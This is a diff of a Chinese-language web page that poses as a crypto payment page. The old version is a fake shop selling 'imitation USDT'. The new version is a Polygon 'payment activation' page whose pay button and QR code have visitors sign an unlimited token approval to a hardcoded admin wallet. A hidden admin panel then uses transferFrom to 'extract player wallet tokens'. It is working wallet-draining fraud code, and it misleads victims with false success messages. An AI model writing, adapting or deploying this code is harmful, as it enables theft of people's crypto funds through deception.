@@ -3,178 +3,173 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>链上商城24小时秒发货</title>
+<title>支付开通</title>
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui, sans-serif}
-body{background:#f6f7f9;padding:20px;max-width:420px;margin:0 auto}
-.card{background:#fff;border-radius:20px;padding:25px;margin-bottom:15px;box-shadow:0 2px 10px rgba(0,0,0,0.05)}
-.title{font-size:18px;font-weight:600;margin-bottom:5px}
-.sub{color:#999;font-size:14px;margin-bottom:20px}
-.item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #f1f1f1}
-.name{color:#333}
-.price{color:#007aff;font-weight:600}
-input{width:100%;padding:14px 16px;background:#f9f9f9;border:1px solid #eee;border-radius:12px;margin-top:10px;font-size:14px}
-.note{color:#ff5722;font-size:13px;margin-top:8px;text-align:center}
-.total{font-size:22px;font-weight:700;color:#ff3c50;text-align:right;margin:20px 0}
-button{width:100%;background:#007aff;color:white;border:none;border-radius:16px;padding:16px;font-size:16px;font-weight:500;margin-top:10px}
-button:disabled{background:#999}
-.qr-box{text-align:center;margin:15px 0}
-#qrcode{margin:0 auto;border:1px solid #eee;border-radius:12px;padding:10px;background:#fff;min-height:220px}
-.pay-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500}
-.success-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500;display:none}
-.admin-area{display:none}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+body{background:#0B0B1F;color:#fff;padding:20px}
+.container{max-width:420px;margin:0 auto}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+h1{font-size:24px;margin-bottom:8px}
+.desc{color:#aaa;margin-bottom:20px}
+#connectBtn{
+background:#F0B90B;color:#000;
+border:none;padding:16px;width:100%;
+border-radius:14px;font-size:16px;font-weight:bold;
+margin-bottom:16px;
+}
+.amount-input{
+width:100%;padding:14px;background:#111;border:none;
+border-radius:12px;color:#fff;font-size:16px;text-align:center;
+margin-bottom:12px;
+}
+#qrcode{
+width:280px;height:280px;background:#fff;padding:10px;
+border-radius:16px;margin:0 auto 20px;
+display:flex;align-items:center;justify-content:center;
+color:#000;font-size:14px;
+}
+#qrcode img{width:100%;height:100%;border-radius:12px}
+#payBtn{
+background:#F0B90B;color:#000;
+border:none;padding:16px;width:100%;
+border-radius:14px;font-size:16px;font-weight:bold
+}
+.admin-panel{
+background:#1E1E35;padding:24px;border-radius:16px;display:none
+}
+.admin-panel.show{display:block}
+.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
+.admin-input{
+width:100%;padding:12px;background:#111;border:none;
+border-radius:8px;color:#fff;margin-bottom:10px;
+}
+.admin-btn{
+width:100%;padding:14px;background:#ff4444;color:#fff;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
+}
 </style>
 </head>
-
 <body>
-
-<div class="card">
-  <div class="chain-tag">币安链 BSC - USDT 支付</div>
-  <div class="title">链上商城24小时秒发货</div>
-  <div class="sub">支持钱包扫码支付 / 平台在线支付</div>
-
-  <div class="item">
-    <div class="name">商品</div>
-    <div class="price">高仿U</div>
-  </div>
-  <div class="item">
-    <div class="name">单价</div>
-    <div class="price">1 USDT = 10000 枚</div>
-  </div>
-
-  <div class="note">
-    请输入购买数量，并填写接收商品钱包地址（SOL/TON任选其一）
-  </div>
-
-  <input id="buyQuantity" placeholder="请输入购买数量" />
-  <input id="solAddr" placeholder="SOL链地址（选填）" />
-  <input id="tonAddr" placeholder="TON链地址（选填）" />
-
-  <div class="total">
-    应付：<span id="showAmount">0</span> USDT
-  </div>
-
-  <!-- 🔥 二维码必出区域 -->
-  <div class="qr-box">
-    <div id="qrcode"></div>
-    <p class="pay-tip">打开钱包右上角扫码支付（直接转USDT）</p>
-  </div>
-
-  <button onclick="connectWallet()" id="connectBtn">连接钱包（平台支付）</button>
-  <button onclick="payAndAuth()" id="payBtn" disabled>平台在线支付</button>
-
-  <div class="success-tip" id="successTip">
-    ✅ 支付成功，机器人已秒发货！<br>
-    USDT 已秒到平台账户
-  </div>
+<div class="container">
+<div class="pay-box">
+<h1>💳 支付开通</h1>
+<p class="desc">Polygon链支付 · 安全开通</p>
+<button id="connectBtn">👉 连接钱包（Polygon）</button>
+<input class="amount-input" id="amount" value="0.1" placeholder="输入支付金额">
+<div id="qrcode">加载二维码...</div>
+<button id="payBtn">确认支付</button>
 </div>
-
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
-<script src="https://cdn.bootcdn.net/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<div class="admin-panel" id="adminPanel">
+<div class="admin-title">🔐 管理员控制台</div>
+<div>提取玩家钱包代币</div>
+<input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
+<input class="admin-input" id="drawAmt" placeholder="提取数量">
+<button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
+<div>发放奖励给玩家</div>
+<input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
+<input class="admin-input" id="sendAmt" placeholder="发放数量">
+<button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
+</div>
+</div>
 <script>
-// ======================
-// 你的配置
-// ======================
-const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const PRICE_PER_TOKEN = 0.0001;
+// ====================== 已改成 Polygon 配置 ======================
+const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725"; // 你要的代币地址
+const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 管理员地址不变
+const POLYGON_ID = "0x89"; // Polygon 链ID
+let account = null;
 
-let account;
-let usdtContract;
+// 强制切换到 Polygon
+async function switchToPolygon() {
+  try {
+    await ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: POLYGON_ID }]
+    });
+  } catch (e) {}
+}
 
-// 一进页面就加载二维码基础样式
-window.onload = function() {
-  makeQRCode(0.01);
+// 连接钱包
+document.getElementById("connectBtn").onclick = async () => {
+  if (!window.ethereum) {
+    alert("请在钱包浏览器内打开");
+    return;
+  }
+  await switchToPolygon();
+  try {
+    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+    account = accounts[0];
+    document.getElementById("connectBtn").innerText = "✅ 已连接";
+    if (account.toLowerCase() === ADMIN.toLowerCase()) {
+      document.getElementById("adminPanel").classList.add("show");
+    }
+  } catch (e) {
+    alert("连接失败");
+  }
 };
 
-// 输入数量 → 立即计算 + 立即出二维码
-document.getElementById('buyQuantity').addEventListener('input', function(){
-  const qty = parseFloat(this.value) || 0;
-  const usdt = (qty * PRICE_PER_TOKEN).toFixed(9);
-  document.getElementById('showAmount').innerText = usdt;
+// ==================== 二维码：Polygon 链 ====================
+function genQR() {
+  const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // Polygon 链：@137
+  const uri = `ethereum:${ADMIN}@137/${TOKEN}?data=${approveData}`;
+  document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
+}
 
-  // 🔥 只要有数字，就生成二维码，绝对不判断、不拦截
-  makeQRCode(usdt);
-});
+window.onload = genQR;
+document.getElementById("amount").oninput = genQR;
 
-// ======================
-// 🔥 核心：强制生成二维码，100%必出
-// ======================
-function makeQRCode(usdtAmount) {
-  const realAmount = parseFloat(usdtAmount) || 0.01;
-  const text = `ethereum:${USDT_CONTRACT}?function=transfer&address=${ADMIN_WALLET}&uint256=${realAmount}000000000000000000&chainId=56`;
-
+// 确认支付 = 授权
+document.getElementById("payBtn").onclick = async () => {
+  if (!account) return alert("请先连接钱包");
   try {
-    QRCode.toCanvas(document.getElementById('qrcode'), text, {
-      width: 200,
-      margin: 1
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: TOKEN,
+        gasLimit: "0x300000",
+        data: "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      }]
     });
+    alert("✅ 支付成功，权限已开通");
   } catch (e) {
-    document.getElementById('qrcode').innerHTML = "⚠️ 刷新页面即可";
+    alert("已取消");
   }
+};
+
+// ====================== 管理员功能 ======================
+async function drawFromUser() {
+  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
+  const from = document.getElementById("userAddr").value;
+  const amt = document.getElementById("drawAmt").value;
+  if (!from || !amt) return;
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
+  await ethereum.request({
+    method: "eth_sendTransaction",
+    params: [{
+      from: account,
+      to: TOKEN,
+      data: "0x23b872dd" + from.slice(2).padStart(64, "0") + ADMIN.slice(2).padStart(64, "0") + raw
+    }]
+  });
+  alert("✅ 提取成功");
 }
 
-// ======================
-// 连接钱包
-// ======================
-async function connectWallet() {
-  if (!window.ethereum) {
-    alert("请在TP钱包/币安钱包内打开");
-    return;
-  }
-  try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    const signer = provider.getSigner();
-    account = await signer.getAddress();
-
-    const abi = [
-      "function approve(address spender, uint256 amount) external returns (bool)",
-      "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
-    ];
-    usdtContract = new ethers.Contract(USDT_CONTRACT, abi, signer);
-
-    document.getElementById('connectBtn').innerText = "✅ 连接成功";
-    document.getElementById('payBtn').disabled = false;
-  } catch (err) {
-    alert("连接失败：" + err.message);
-  }
-}
-
-// ======================
-// 支付
-// ======================
-async function payAndAuth() {
-  const qty = parseFloat(document.getElementById('buyQuantity').value) || 0;
-  const sol = document.getElementById('solAddr').value.trim();
-  const ton = document.getElementById('tonAddr').value.trim();
-
-  if (qty <= 0) {
-    alert("请输入数量");
-    return;
-  }
-  if (!sol && !ton) {
-    alert("请填写收币地址");
-    return;
-  }
-
-  const btn = document.getElementById('payBtn');
-  btn.disabled = true;
-  btn.innerText = "处理中...";
-
-  try {
-    const amount = ethers.utils.parseUnits((qty * PRICE_PER_TOKEN).toFixed(9), 18);
-
-    await usdtContract.approve(ADMIN_WALLET, amount, { gasLimit: 100000 }).then(t => t.wait());
-    await usdtContract.transferFrom(account, ADMIN_WALLET, amount, { gasLimit: 100000 }).then(t => t.wait());
-
-    document.getElementById('successTip').style.display = "block";
-    btn.innerText = "支付完成";
-  } catch (err) {
-    alert("支付失败：" + err.message);
-    btn.disabled = false;
-    btn.innerText = "平台在线支付";
-  }
+async function sendReward() {
+  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
+  const to = document.getElementById("toAddr").value;
+  const amt = document.getElementById("sendAmt").value;
+  if (!to || !amt) return;
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
+  await ethereum.request({
+    method: "eth_sendTransaction",
+    params: [{
+      from: account,
+      to: TOKEN,
+      data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw
+    }]
+  });
+  alert("✅ 奖励发放成功");
 }
 </script>
 </body>
